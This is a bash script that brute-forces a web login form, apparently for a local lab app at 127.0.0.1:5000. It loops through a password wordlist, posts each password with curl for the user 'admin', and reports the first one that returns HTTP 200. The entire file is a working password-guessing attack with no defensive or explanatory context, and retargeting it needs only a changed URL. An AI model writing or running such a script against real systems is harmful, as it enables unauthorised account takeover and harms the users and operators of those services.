#!/bin/bash

# Define the login URL
URL="http://127.0.0.1:5000/login"

# Define the username
USER="admin"

# Define the path to your password list file
PASSWORD_LIST="fasttrack.txt"

# Loop through each password in the password list
while read -r password; do
    echo "Trying password: $password"
    
    # Send POST request using curl
    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "username=$USER&password=$password" "$URL")
    
    # Check the HTTP status code
    if [ "$response" -eq 200 ]; then
        echo "Login successful with password: $password"
        break
    elif [ "$response" -eq 403 ]; then
        echo "Failed login attempt with password: $password"
    else
        echo "Unexpected response code: $response"
    fi
done < "$PASSWORD_LIST"
